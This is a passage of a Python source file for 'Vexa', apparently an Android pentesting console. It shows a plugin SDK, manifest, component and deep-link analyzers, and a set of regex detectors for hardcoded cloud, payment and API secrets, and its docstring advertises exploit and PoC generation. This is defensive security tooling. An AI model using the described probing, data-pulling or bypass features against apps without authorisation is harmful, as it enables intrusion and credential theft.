"""
Vexa — Mobile Application Security Console
============================================

Offline Android pentesting console with auto-PoC generation. No API keys required.

CAPABILITIES:
  Static Analysis (no device needed):
    - Manifest, components, deep links, permissions
    - Hardcoded secret scanner (AWS/GCP/GitHub/Stripe/JWT/private keys)
    - WebView misconfig detector
    - Weak crypto / hash detector
    - Network security (cleartext, NSC, TrustManager bypass)
    - Native lib inventory

  Dynamic Analysis (requires connected device + adb):
    - Live device detection
    - Install/uninstall the target APK
    - Trigger every exported activity / service / receiver
    - Probe every content provider (path traversal, SQLi)
    - Fire every detected deep link with payload variants
    - Pull app private data (when debuggable / backup-allowed)

  Exploit Advisor (rule-based, fully offline):
    - Auto-generates concrete adb commands per finding
    - Frida hook scripts for SSL pinning bypass / root detection bypass
    - Web PoC HTML for deep link exploitation

  Optional Local LLM (Ollama auto-detection):
    - If Ollama is installed locally, an AI chat tab appears
    - Still no API keys — everything runs on your machine

USAGE (Windows):
    1. Install Python 3.10+   https://www.python.org/downloads/
       (tick "Add python.exe to PATH")
    2. Install dependencies:
       pip install fastapi uvicorn python-multipart androguard==3.4.0a1 httpx
    3. (Optional) Install Android platform-tools for adb:
       https://developer.android.com/tools/releases/platform-tools
    4. Run:
       python vexa.py
    5. Open http://127.0.0.1:8000

LEGAL: Authorized testing only. Use on apps you own or have written
       permission to test, or apps in scope of a bug bounty program.
"""
from __future__ import annotations

import os
import io
import re
import sys
import json
import uuid
import html
import shutil
import logging
import asyncio
import subprocess
from pathlib import Path
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import Any, Optional

try:
    from fastapi import FastAPI, UploadFile, File, HTTPException, Body, Request
    from fastapi.middleware.cors import CORSMiddleware
    from fastapi.responses import HTMLResponse, Response, PlainTextResponse, RedirectResponse, JSONResponse
    import uvicorn
    import httpx
except ImportError as e:
    print(f"\n[-] Missing dependency: {e}")
    print("\n    Run this command, then try again:")
    print("    pip install fastapi uvicorn python-multipart androguard==3.4.0a1 httpx\n")
    sys.exit(1)

try:
    from androguard.misc import AnalyzeAPK
except ImportError:
    print("\n[-] androguard is not installed.")
    print("    Run: pip install androguard==3.4.0a1\n")
    sys.exit(1)


def _load_apk_object(path):
    """Load an APK object using whichever androguard module path is available.
    androguard 4.x uses androguard.core.apk; 3.x uses androguard.core.bytecodes.apk."""
    last_err = None
    for mod_path in ("androguard.core.apk", "androguard.core.bytecodes.apk"):
        try:
            mod = __import__(mod_path, fromlist=["APK"])
            return mod.APK(path)
        except (ImportError, ModuleNotFoundError) as e:
            last_err = e
            continue
    raise RuntimeError(f"Could not load APK class from any known androguard path. Last error: {last_err}")

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)-7s | %(message)s")
log = logging.getLogger("vexa")

ROOT = Path(__file__).resolve().parent
DATA_DIR = ROOT / "vexa_data"
UPLOAD_DIR = DATA_DIR / "uploads"
REPORT_DIR = DATA_DIR / "reports"
PULLED_DIR = DATA_DIR / "pulled"
for d in (UPLOAD_DIR, REPORT_DIR, PULLED_DIR):
    d.mkdir(parents=True, exist_ok=True)

MAX_UPLOAD_MB = 512


# =============================================================================
# Models
# =============================================================================
@dataclass
class Finding:
    id: str
    title: str
    severity: str
    category: str
    description: str
    evidence: str = ""
    recommendation: str = ""
    cwe: Optional[str] = None
    cve: Optional[str] = None        # e.g., "CVE-2017-13156"
    cvss: Optional[float] = None     # e.g., 7.5
    masvs: Optional[str] = None
    impact: str = ""                 # business / technical impact paragraph
    fix: str = ""                    # concrete remediation steps (numbered)
    references: list = field(default_factory=list)
    metadata: dict = field(default_factory=dict)
    confidence: str = "confirmed"
    source: str = "vexa"

    def to_dict(self):
        return asdict(self)


# =============================================================================
# Vexa Framework SDK -- Public Extension API
# =============================================================================
# This section defines the stable contract for plugins. Anything below this
# header is part of the public SDK: change with semantic-versioning rules
# (breaking changes bump VEXA_PLUGIN_API_VERSION's major).
#
# A plugin is any Python module that lives in `vexa_plugins/` and exposes one or
# more of the extension types below. Plugins are auto-discovered at startup.
#
# Quick start:
#
#   # vexa_plugins/my_check.py
#   from vexa import register_analyzer, Finding
#
#   @register_analyzer("my-custom-check", platform="android")
#   def my_check(ctx):
#       findings = []
#       if "DEBUG_FLAG" in ctx.get_strings():
#           findings.append(Finding(
#               id="my-debug-flag",
#               title="Debug flag found",
#               severity="low", category="MASVS-CODE",
#               description="Internal debug flag baked into binary"))
#       return findings
#
# Versioning policy:
#   * 1.x -- additive only. New optional Finding fields, new hook types, new
#     keyword args to register_*. Existing plugins keep working.
#   * 2.0+ -- only if a stable extension point must be removed.
# =============================================================================

VEXA_PLUGIN_API_VERSION = "1.0.0"
FINDING_SCHEMA_VERSION = 1


class VexaPluginError(Exception):
    """Raised when a plugin is malformed or fails to load. Caught at registration
    time so a single broken plugin can't crash Vexa startup."""


# Public extension registries. Plugins call register_* helpers to populate these.
# Vexa core reads them when building ANALYZERS, SECRET_PATTERNS, EXPLOIT_RECIPES,
# REPORT_SECTIONS, and HOOKS.
_PLUGIN_REGISTRY = {
    "analyzers": [],         # list of (name, callable, platform)
    "secret_patterns": [],   # list of (name, regex_pattern, kind, severity, source)
    "exploit_recipes": {},   # dict of recipe_key -> recipe dict
    "exploit_steps": {},     # dict of recipe_key -> list of {title, detail, verify}
    "exploit_requirements": {},  # dict of recipe_key -> list of strings
    "report_sections": [],   # list of (name, callable, position)
    "cve_enrichment": {},    # dict of finding_id_prefix -> enrichment dict
    "hooks": {               # event name -> list of callables
        "pre_scan": [],
        "post_scan": [],
        "pre_finding": [],
        "post_finding": [],
        "pre_report": [],
    },
    "_loaded_plugins": [],   # list of {name, path, version, registered}
}


def register_analyzer(name: str, platform: str = "android"):
    """Decorator: register a function as a Vexa analyzer.

    Args:
        name: unique identifier for this analyzer (used in finding IDs)
        platform: "android" or "ios"

    The decorated function must accept a single `Ctx` argument and return a
    list of `Finding` objects (or an empty list).

    Example:
        @register_analyzer("hardcoded-debug-host", platform="android")
        def check_debug_host(ctx):
            findings = []
            for s in ctx.get_strings():
                if "debug.example.com" in s:
                    findings.append(Finding(
                        id="debug-host-found",
                        title="Debug host hardcoded",
                        severity="medium", category="MASVS-CODE",
                        description="A debug-environment host was found in the binary",
                        evidence=s,
                    ))
            return findings
    """
    def _wrap(fn):
        if not callable(fn):
            raise VexaPluginError(f"register_analyzer({name!r}): target is not callable")
        if platform not in ("android", "ios"):
            raise VexaPluginError(
                f"register_analyzer({name!r}): platform must be 'android' or 'ios', got {platform!r}")
        _PLUGIN_REGISTRY["analyzers"].append((name, fn, platform))
        return fn
    return _wrap


def register_secret_pattern(name: str, pattern: str, kind: str = "generic",
                            severity: str = "high", source: str = "plugin"):
    """Register a regex-based secret detector.

    Args:
        name: human-readable name (e.g., "Acme Inc API Token")
        pattern: regex source string. Compile-tested at registration.
        kind: free-form classifier (e.g., "api-key", "oauth", "private-key")
        severity: "critical"|"high"|"medium"|"low"|"info"
        source: which plugin emitted this; used in evidence text
    """
    try:
        re.compile(pattern)
    except re.error as e:
        raise VexaPluginError(f"register_secret_pattern({name!r}): bad regex -- {e}")
    if severity not in ("critical", "high", "medium", "low", "info"):
        raise VexaPluginError(f"register_secret_pattern({name!r}): bad severity {severity!r}")
    _PLUGIN_REGISTRY["secret_patterns"].append((name, pattern, kind, severity, source))


def register_exploit_recipe(key: str, title: str, explanation: str,
                            tags: list, build: callable,
                            steps: Optional[list] = None,
                            requirements: Optional[list] = None,
                            classification: Optional[dict] = None,
                            attack_id: Optional[str] = None,
                            attack_name: Optional[str] = None):
    """Register a new exploit recipe usable by the AI Console.

    Args:
        key: unique identifier (e.g., "my-custom-exploit")
        title: human-readable title shown at the top of the document
        explanation: 1-3 sentence summary of the vulnerability class
        tags: list of natural-language phrases that trigger this recipe
              (e.g., ["my-bug", "custom exploit", "thing-bypass"])
        build: callable that takes a report dict and returns a string
               (the parameterised PoC code/commands).
        steps: optional list of {"title", "detail", "verify"} dicts
        requirements: optional list of strings (preconditions)
        classification: optional dict with cwe/cvss/masvs/severity
        attack_id: optional MITRE ATT&CK technique ID (e.g., "T1565.001")
        attack_name: optional human label for the ATT&CK technique
    """
    if not callable(build):
        raise VexaPluginError(f"register_exploit_recipe({key!r}): build must be callable")
    if not isinstance(tags, list) or not tags:
        raise VexaPluginError(f"register_exploit_recipe({key!r}): tags must be a non-empty list")
    _PLUGIN_REGISTRY["exploit_recipes"][key] = {
        "title": title,
        "explanation": explanation,
        "tags": [t.lower() for t in tags],
        "build": build,
    }
    if steps:
        _PLUGIN_REGISTRY["exploit_steps"][key] = steps
    if requirements:
        _PLUGIN_REGISTRY["exploit_requirements"][key] = requirements
    if classification:
        _PLUGIN_REGISTRY.setdefault("exploit_classification", {})[key] = classification
    if attack_id:
        _PLUGIN_REGISTRY.setdefault("exploit_attack_mapping", {})[key] = (
            attack_id, attack_name or attack_id)


def register_cve_enrichment(finding_id_prefix: str, enrichment: dict):
    """Attach CVE/CVSS/CWE/impact/fix metadata to any Finding whose id starts with
    `finding_id_prefix`. Useful for plugins that detect a known-CVE bug class.

    Args:
        finding_id_prefix: prefix to match (e.g., "my-jackson-")
        enrichment: dict with any of: cve, cvss, cwe, masvs, impact, fix, references
    """
    _PLUGIN_REGISTRY["cve_enrichment"][finding_id_prefix] = enrichment


def register_report_section(name: str, position: str = "after_findings"):
    """Decorator: register a function that emits a custom HTML section in the
    enterprise report.

    Args:
        name: section heading (used as <h2>)
        position: where to insert. One of:
            "after_executive_summary" | "after_attack_surface" |
            "after_findings" | "before_methodology" | "appendix"

    The decorated function takes a report dict and returns a raw HTML string.
    Return "" to skip rendering.
    """
    valid = ("after_executive_summary", "after_attack_surface",
             "after_findings", "before_methodology", "appendix")
    if position not in valid:
        raise VexaPluginError(
            f"register_report_section({name!r}): position must be one of {valid}")

    def _wrap(fn):
        if not callable(fn):
            raise VexaPluginError(f"register_report_section({name!r}): target not callable")
        _PLUGIN_REGISTRY["report_sections"].append((name, fn, position))
        return fn
    return _wrap


def register_hook(event: str):
    """Decorator: register a hook for a scan-pipeline event.

    Events:
        "pre_scan"       -- called with (apk_path, report_skeleton) before scanning
        "post_scan"      -- called with (report_dict) after all analyzers run
        "pre_finding"    -- called with (finding) before each finding is emitted;
                            return None to drop, or a (possibly-modified) Finding
        "post_finding"   -- called with (finding) after enrichment, before storage
        "pre_report"     -- called with (report_dict, format_str) before report
                            generation; can mutate the report in place

    Hooks are run in registration order. A hook that raises is logged and skipped;
    other hooks continue.
    """
    if event not in _PLUGIN_REGISTRY["hooks"]:
        raise VexaPluginError(f"register_hook: unknown event {event!r}")

    def _wrap(fn):
        if not callable(fn):
            raise VexaPluginError(f"register_hook({event!r}): target not callable")
        _PLUGIN_REGISTRY["hooks"][event].append(fn)
        return fn
    return _wrap


def _run_hooks(event: str, *args, **kwargs):
    """Internal: dispatch all hooks registered for an event. Used by the scan
    pipeline. Catches exceptions per hook so one broken plugin can't kill scans."""
    results = []
    for hook in _PLUGIN_REGISTRY["hooks"].get(event, []):
        try:
            r = hook(*args, **kwargs)
            results.append(r)
        except Exception as e:
            log.warning("Plugin hook %r on %r failed: %s", hook.__name__, event, e)
    return results


def load_plugins(plugin_dir: Optional[Path] = None) -> list:
    """Discover and load plugins from a directory.

    Each .py file in `plugin_dir` is imported once. Plugins use the register_*
    helpers to extend Vexa. Returns a list of {name, path, error} dicts so the
    caller can show what loaded.

    Plugins that raise during import are skipped with a warning -- one bad plugin
    will not prevent Vexa from starting.
    """
    if plugin_dir is None:
        plugin_dir = ROOT / "vexa_plugins"
    plugin_dir = Path(plugin_dir)
    loaded = []
    if not plugin_dir.exists():
        log.info("No plugin directory at %s -- skipping plugin discovery", plugin_dir)
        return loaded
    if not plugin_dir.is_dir():
        log.warning("%s is not a directory -- skipping plugin discovery", plugin_dir)
        return loaded

    import importlib.util
    for path in sorted(plugin_dir.glob("*.py")):
        if path.name.startswith("_"):
            continue
        record = {"name": path.stem, "path": str(path), "error": None}
        try:
            # Snapshot registry sizes so we can report what this plugin added
            before = {k: (len(v) if hasattr(v, "__len__") else 0)
                      for k, v in _PLUGIN_REGISTRY.items() if k != "_loaded_plugins"}

            spec = importlib.util.spec_from_file_location(f"vexa_plugin_{path.stem}", path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            after = {k: (len(v) if hasattr(v, "__len__") else 0)
                     for k, v in _PLUGIN_REGISTRY.items() if k != "_loaded_plugins"}
            registered = {k: after[k] - before[k] for k in before if after[k] != before[k]}
            record["registered"] = registered
            record["version"] = getattr(module, "__version__", "?")
            log.info("Loaded plugin %s (registered: %s)", path.name,
                     ", ".join(f"{k}+{v}" for k, v in registered.items()) or "nothing")
        except Exception as e:
            record["error"] = f"{type(e).__name__}: {e}"
            log.warning("Plugin %s failed to load: %s", path.name, e)
        loaded.append(record)
        _PLUGIN_REGISTRY["_loaded_plugins"].append(record)
    return loaded


def list_plugins() -> list:
    """Return metadata about loaded plugins. Used by the /api/plugins endpoint."""
    return list(_PLUGIN_REGISTRY["_loaded_plugins"])


# =============================================================================
# End of Vexa Framework SDK
# =============================================================================


@dataclass
class Ctx:
    apk: Any
    dex_list: list
    dx: Any
    extras: dict = field(default_factory=dict)
    _cached_strings: Optional[list] = None  # populated by _get_strings on first call


# Maximum DEX strings to extract (caps runaway memory/time on huge apps)
MAX_DEX_STRINGS = 200_000


def _get_strings(ctx: Ctx) -> list:
    """Lazy + cached DEX string extraction. First call extracts and caches; subsequent calls return cached list."""
    if ctx._cached_strings is not None:
        return ctx._cached_strings
    out = []
    for dex in ctx.dex_list:
        try:
            for s in dex.get_strings():
                if s and len(out) < MAX_DEX_STRINGS:
                    out.append(str(s))
                if len(out) >= MAX_DEX_STRINGS:
                    break
        except Exception:
            continue
        if len(out) >= MAX_DEX_STRINGS:
            break
    ctx._cached_strings = out
    return out


# =============================================================================
# Static Analyzers
# =============================================================================
def analyze_manifest(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        if apk.get_element("application", "debuggable") == "true":
            f.append(Finding(
                id="app-debuggable", title="Application is debuggable", severity="high",
                category="MASVS-RESILIENCE",
                description="android:debuggable=\"true\" lets attackers attach a debugger via ADB, inspect memory, and bypass client-side controls.",
                evidence="<application android:debuggable=\"true\">",
                recommendation="Set android:debuggable=\"false\" for release builds.",
                cwe="CWE-489", masvs="MSTG-RESILIENCE-2"))
    except Exception:
        pass
    try:
        backup = apk.get_element("application", "allowBackup")
        if backup is None or backup == "true":
            f.append(Finding(
                id="allow-backup", title="ADB backup is enabled", severity="medium",
                category="MASVS-STORAGE",
                description="allowBackup defaults to true. An attacker with USB debugging can extract private data via 'adb backup'.",
                evidence=f"android:allowBackup=\"{backup or 'unset (defaults to true)'}\"",
                recommendation="Set android:allowBackup=\"false\" unless backup is required.",
                cwe="CWE-200", masvs="MSTG-STORAGE-8"))
    except Exception:
        pass
    try:
        min_sdk = apk.get_min_sdk_version()
        target_sdk = apk.get_target_sdk_version()
        if min_sdk and int(min_sdk) < 24:
            f.append(Finding(
                id="low-min-sdk", title=f"Low minSdkVersion ({min_sdk})", severity="medium",
                category="MASVS-PLATFORM",
                description=f"minSdkVersion {min_sdk} exposes the app to legacy Android versions lacking modern security mitigations.",
                evidence=f"minSdkVersion={min_sdk}",
                recommendation="Raise minSdkVersion to 24+.",
                cwe="CWE-1104"))
        if target_sdk and int(target_sdk) < 30:
            f.append(Finding(
                id="low-target-sdk", title=f"Outdated targetSdkVersion ({target_sdk})", severity="low",
                category="MASVS-PLATFORM",
                description="targetSdkVersion opts the app out of newer platform security defaults.",
                evidence=f"targetSdkVersion={target_sdk}",
                recommendation="Update to a recent API level."))
    except Exception:
        pass
    try:
        if apk.get_element("application", "usesCleartextTraffic") == "true":
            f.append(Finding(
                id="cleartext-traffic", title="Cleartext (HTTP) traffic explicitly allowed", severity="high",
                category="MASVS-NETWORK",
                description="usesCleartextTraffic=true permits unencrypted HTTP. Sensitive data can be exposed to MITM.",
                evidence="<application android:usesCleartextTraffic=\"true\">",
                recommendation="Set to false. Use HTTPS everywhere.",
                cwe="CWE-319", masvs="MSTG-NETWORK-1"))
    except Exception:
        pass
    return f


def analyze_components(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    exported_components = []
    specs = [
        ("activity", "Activity", "MSTG-PLATFORM-11"),
        ("activity-alias", "Activity alias", "MSTG-PLATFORM-11"),
        ("service", "Service", "MSTG-PLATFORM-11"),
        ("receiver", "Broadcast receiver", "MSTG-PLATFORM-11"),
        ("provider", "Content provider", "MSTG-PLATFORM-2"),
    ]
    for tag, label, masvs in specs:
        try:
            elements = apk.find_tags(tag) or []
        except Exception:
            elements = []
        for elem in elements:
            try:
                name = apk.get_value_from_tag(elem, "name") or "<unknown>"
                exported_attr = apk.get_value_from_tag(elem, "exported")
                permission = apk.get_value_from_tag(elem, "permission")
                authorities = apk.get_value_from_tag(elem, "authorities") if tag == "provider" else None
                has_filter = False
                try:
                    for child in elem:
                        if getattr(child, "tag", "").endswith("intent-filter"):
                            has_filter = True
                            break
                except Exception:
                    pass
                if exported_attr == "false":
                    continue
                exported = exported_attr == "true" or has_filter or (tag == "provider" and authorities)
                if not exported:
                    continue
                if tag == "provider":
                    sev = "high" if not permission else "medium"
                    desc = "Exported content provider. Other apps may read/write data or pivot via path traversal/SQLi."
                elif tag in ("service", "receiver"):
                    sev = "medium" if not permission else "low"
                    desc = f"Exported {label.lower()}. Any app on the device can send intents to it."
                else:
                    sev = "medium" if has_filter else "low"
                    desc = "Exported activity reachable from external apps. Validate all incoming Intent extras and URI parameters."
                exported_components.append({
                    "tag": tag, "name": name, "permission": permission,
                    "has_filter": has_filter, "label": label, "authorities": authorities,
                })
                f.append(Finding(
                    id=f"exported-{tag}-{name.split('.')[-1]}".lower(),
                    title=f"Exported {label}: {name}",
                    severity=sev, category="MASVS-PLATFORM", description=desc,
                    evidence=f"<{tag} name=\"{name}\" exported=\"{exported_attr or 'implicit'}\" permission=\"{permission or 'none'}\">",
                    recommendation="If not meant to be public, set exported=\"false\". Otherwise add signature-level permission and validate all Intent inputs.",
                    cwe="CWE-926", masvs=masvs,
                    metadata={"name": name, "permission": permission, "tag": tag, "authorities": authorities}))
            except Exception:
                continue
    ctx.extras["exported_components"] = exported_components
    return f


def analyze_deeplinks(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    deeplinks = []
    NS = "{http://schemas.android.com/apk/res/android}"
    for tag in ("activity", "activity-alias"):
        try:
            elements = apk.find_tags(tag) or []
        except Exception:
            continue
        for elem in elements:
            try:
                activity = apk.get_value_from_tag(elem, "name") or "<unknown>"
                for child in elem:
                    if not getattr(child, "tag", "").endswith("intent-filter"):
                        continue
                    actions, categories, data_entries = [], [], []
                    auto_verify = child.get(f"{NS}autoVerify") == "true"
                    for sub in child:
                        sub_tag = getattr(sub, "tag", "").split("}", 1)[-1]
                        if sub_tag == "action":
                            n = sub.get(f"{NS}name")
                            if n: actions.append(n)
                        elif sub_tag == "category":
                            n = sub.get(f"{NS}name")
                            if n: categories.append(n)
                        elif sub_tag == "data":
                            entry = {}
                            for attr in ("scheme", "host", "port", "path", "pathPrefix", "pathPattern"):
                                v = sub.get(f"{NS}{attr}")
                                if v: entry[attr] = v
                            if entry: data_entries.append(entry)
                    if "android.intent.category.BROWSABLE" in categories and "android.intent.action.VIEW" in actions:
                        for d in data_entries:
                            uri = ""
                            if "scheme" in d:
                                uri = d["scheme"] + "://"
                                if "host" in d:
                                    uri += d["host"]
                                    if "port" in d: uri += ":" + d["port"]
                                if "path" in d: uri += d["path"]
                                elif "pathPrefix" in d: uri += d["pathPrefix"] + "*"
                                elif "pathPattern" in d: uri += d["pathPattern"]
                            deeplinks.append({
                                "activity": activity, "uri": uri, "auto_verify": auto_verify,
                                "scheme": d.get("scheme"), "host": d.get("host"),
                            })
            except Exception:
                continue
    if not deeplinks:
        return f
    ctx.extras["deeplinks"] = deeplinks
    has_custom = any(d.get("scheme") and d["scheme"] not in ("http", "https") for d in deeplinks)
    has_unverified = any(d.get("scheme") in ("http", "https") and not d.get("auto_verify") for d in deeplinks)
    severity = "high" if (has_custom or has_unverified) else "medium"
    sample = ", ".join(sorted({d["uri"] for d in deeplinks if d["uri"]}))[:400]
    f.append(Finding(
        id="deeplinks-exposed",
        title=f"{len(deeplinks)} deep link entry point(s) detected",
        severity=severity, category="MASVS-PLATFORM",
        description="Deep links are externally reachable URIs that map to activities. Primary attack surface — malicious websites or other apps can craft links that trigger sensitive flows.",
        evidence=sample or "see metadata",
        recommendation="For HTTPS links, use App Links with autoVerify=true. Treat every Intent URI as untrusted input.",
        cwe="CWE-939", masvs="MSTG-PLATFORM-3",
        metadata={"count": len(deeplinks), "links": deeplinks[:50]}))
    return f


SECRET_PATTERNS = [
    # Cloud / Infra
    ("aws-access-key",   "AWS Access Key ID",        r"\b(?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA|APKA)[0-9A-Z]{16}\b", "critical", "CWE-798"),
    ("aws-secret-key",   "AWS Secret Access Key",    r"(?i)aws[_\-]?secret[_\-]?access[_\-]?key[\"']?\s*[:=]\s*[\"']([A-Za-z0-9+/]{40})[\"']", "critical", "CWE-798"),
    ("aws-session",      "AWS Session Token",        r"\bFQoGZXIvYXdzE[A-Za-z0-9+/=]{100,}\b", "critical", "CWE-798"),
    ("gcp-api-key",      "Google Cloud API key",     r"\bAIza[0-9A-Za-z\-_]{35}\b", "high", "CWE-798"),
    ("gcp-service-acct", "GCP service-account JSON", r'"type"\s*:\s*"service_account"', "critical", "CWE-798"),
    ("azure-key",        "Azure Storage Key",        r"\bAccountKey=[A-Za-z0-9+/]{86}==\b", "critical", "CWE-798"),
    ("azure-conn",       "Azure connection string",  r"\bDefaultEndpointsProtocol=https?;AccountName=[A-Za-z0-9]+", "high", "CWE-798"),
    ("digitalocean",     "DigitalOcean PAT",         r"\bdop_v1_[a-f0-9]{64}\b", "high", "CWE-798"),

    # Code hosting / CI
    ("github-pat",       "GitHub Personal Access Token", r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}\b", "critical", "CWE-798"),
    ("github-pat-fine",  "GitHub fine-grained PAT",  r"\bgithub_pat_[A-Za-z0-9_]{82}\b", "critical", "CWE-798"),
    ("gitlab-token",     "GitLab Personal Token",    r"\bglpat-[A-Za-z0-9_\-]{20}\b", "critical", "CWE-798"),
    ("npm-token",        "npm token",                r"\bnpm_[A-Za-z0-9]{36}\b", "high", "CWE-798"),

    # Payment
    ("stripe-secret",    "Stripe live/test secret key", r"\bsk_(?:live|test)_[A-Za-z0-9]{24,}\b", "critical", "CWE-798"),
    ("stripe-restricted","Stripe restricted key",    r"\brk_(?:live|test)_[A-Za-z0-9]{24,}\b", "high", "CWE-798"),
    ("stripe-publish",   "Stripe publishable key",   r"\bpk_(?:live|test)_[A-Za-z0-9]{24,}\b", "low", "CWE-200"),
    ("paypal-token",     "PayPal Braintree token",   r"\baccess_token\$production\$[a-z0-9]{16}\$[a-f0-9]{32}\b", "critical", "CWE-798"),
    ("square-token",     "Square access token",      r"\bsq0(?:atp|csp|idp)-[A-Za-z0-9_\-]{22,43}\b", "critical", "CWE-798"),

    # Communication / Email / SMS
    ("slack-bot",        "Slack bot/user token",     r"\bxox[baprs]-[A-Za-z0-9\-]{10,}\b", "high", "CWE-798"),
    ("slack-webhook",    "Slack webhook URL",        r"\bhttps?://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{20,}\b", "medium", "CWE-200"),
    ("discord-token",    "Discord bot token",        r"\b[MN][A-Za-z0-9]{23}\.[\w\-]{6}\.[\w\-]{27,}\b", "high", "CWE-798"),
    ("discord-webhook",  "Discord webhook URL",      r"\bhttps?://(?:discord(?:app)?\.com|discord\.com)/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+\b", "medium", "CWE-200"),
    ("telegram-bot",     "Telegram bot token",       r"\b\d{8,10}:[A-Za-z0-9_\-]{35}\b", "high", "CWE-798"),
    ("twilio-sid",       "Twilio Account SID",       r"\bAC[a-f0-9]{32}\b", "medium", "CWE-200"),
    ("sendgrid-key",     "SendGrid API key",         r"\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b", "high", "CWE-798"),
    ("mailgun-key",      "Mailgun API key",          r"\bkey-[a-f0-9]{32}\b", "high", "CWE-798"),
    ("mailchimp-key",    "Mailchimp API key",        r"\b[a-f0-9]{32}-us\d{1,2}\b", "high", "CWE-798"),

    # Firebase / Google
    ("firebase-url",     "Firebase Realtime DB URL", r"\bhttps?://[a-z0-9\-]+\.firebaseio\.com\b|\bhttps?://[a-z0-9\-]+\.firebasedatabase\.app\b", "medium", "CWE-200"),
    ("firebase-config",  "Firebase API key",         r'"apiKey"\s*:\s*"AIza[A-Za-z0-9_\-]{35}"', "high", "CWE-798"),
    ("gcp-oauth",        "Google OAuth client",      r"\b\d+-[A-Za-z0-9_]{32}\.apps\.googleusercontent\.com\b", "low", "CWE-200"),
    ("mapbox-token",     "Mapbox access token",      r"\bpk\.eyJ[A-Za-z0-9_\-\.]{10,}\b", "medium", "CWE-200"),

    # AI / ML
    ("openai-key",       "OpenAI API key",           r"\bsk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}\b|\bsk-proj-[A-Za-z0-9_\-]{40,}\b", "high", "CWE-798"),
    ("anthropic-key",    "Anthropic API key",        r"\bsk-ant-(?:api03|sid01)-[A-Za-z0-9_\-]{40,}\b", "high", "CWE-798"),
    ("hf-token",         "Hugging Face token",       r"\bhf_[A-Za-z0-9]{34}\b", "medium", "CWE-798"),

    # Generic / crypto
    ("jwt",              "JSON Web Token",           r"\beyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\b", "medium", "CWE-200"),
    ("private-key",      "Private Key (PEM)",        r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED |)PRIVATE KEY( BLOCK)?-----", "critical", "CWE-798"),
    ("pgp-key",          "PGP private key",          r"-----BEGIN PGP PRIVATE KEY BLOCK-----", "critical", "CWE-798"),

    # S3 / internal hosts
    ("aws-s3-bucket",    "AWS S3 bucket URL",        r"\bhttps?://[a-z0-9\.\-]+\.s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com\b|\bs3://[a-z0-9\.\-]{3,63}\b", "low", "CWE-200"),
    ("internal-host",    "RFC1918 internal host",    r"\b(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b", "info", "CWE-200"),

    # Generic placeholder credential
    ("generic-secret",   "Generic credential",       r"(?i)(?:password|passwd|pwd|secret|api[_\-]?key|access[_\-]?key|auth[_\-]?token|bearer)\s*[:=]\s*[\"']([A-Za-z0-9_\-+/=]{12,})[\"']", "medium", "CWE-798"),
]

# Precompile SECRET_PATTERNS once at module load (huge speedup vs recompiling per scan).
_COMPILED_SECRET_PATTERNS = []
for _pid, _title, _rx, _sev, _cwe in SECRET_PATTERNS:
    try:
        _COMPILED_SECRET_PATTERNS.append((_pid, _title, re.compile(_rx), _sev, _cwe))
    except re.error as _e:
        log.warning("Skipping invalid secret pattern %s: %s", _pid, _e)


def analyze_secrets(ctx: Ctx) -> list:
    f = []
    seen = set()

    # 1) DEX constant-pool strings (cached -- populated once per scan)
    strings = _get_strings(ctx)

    # 2) Scan reasonable text-like files in the APK (cap at 200 files)
    extra_blobs = []
    try:
        seen_files = 0
        for fn in ctx.apk.get_files():
            if seen_files >= 200:
                break
            lower = fn.lower()
            if "androidmanifest" in lower:
                continue
            if (lower.startswith(("assets/", "res/raw/", "res/values/")) or
                lower.endswith((".json", ".properties", ".txt", ".xml", ".yaml", ".yml",
                                ".js", ".html", ".cfg", ".ini", ".env", ".conf"))):
                try:
                    raw = ctx.apk.get_file(fn)
                    if not raw or len(raw) > 2_000_000:
                        continue
                    text = raw.decode("utf-8", errors="ignore")
                    if text:
                        extra_blobs.append((fn, text))
                        seen_files += 1
                except Exception:
                    continue
    except Exception:
        pass

    # NOTE: raw DEX byte scan removed -- it duplicated constant-pool work
    # for ~5x the cost. Constant pool covers all string literals already.

    def scan(source, text):
        for pid, title, regex, sev, cwe in _COMPILED_SECRET_PATTERNS:
            try:
                for m in regex.finditer(text):
                    value = m.group(0)
                    key = (pid, value)
                    if key in seen:
                        continue
                    seen.add(key)
                    if len(seen) > 500:
                        return
                    snippet = value if len(value) <= 80 else value[:60] + "..."
                    f.append(Finding(
                        id=f"secret-{pid}-{len(seen)}",
                        title=f"Hardcoded secret: {title}",
                        severity=sev, category="MASVS-CODE",
                        description="Secrets shipped in client binaries can be extracted by anyone with the APK. Decompile with apktool/jadx and grep for the leaked credential.",
                        evidence=f"{source}: {snippet}",
                        recommendation="Move the secret to a backend the app authenticates to (proxy pattern). Rotate the leaked credential immediately.",
                        cwe=cwe, masvs="MSTG-CODE-2",
                        cvss=8.8 if sev == "critical" else (7.5 if sev == "high" else 5.3),
                        impact=("Account takeover, data exfiltration, billing/quota theft, "
                                "supply-chain compromise -- depending on the credential's privileges."),
                        fix=("1) Rotate the credential at the upstream provider. "
                             "2) Move auth to backend (issue short-lived tokens). "
                             "3) Remove from source + Git history (BFG / git-filter-repo). "
                             "4) Set up secret-scanning in CI."),
                        references=[
                            "https://owasp.org/www-project-mobile-app-security/MASVS/Controls/MASVS-CODE/",
                            "https://cwe.mitre.org/data/definitions/798.html",
                        ],
                        confidence="confirmed",
                    ))
            except Exception:
                continue

    for s in strings:
        scan("dex strings", s)
    for fn, text in extra_blobs:
        scan(fn, text)
    return f


WEBVIEW_CALLS = {
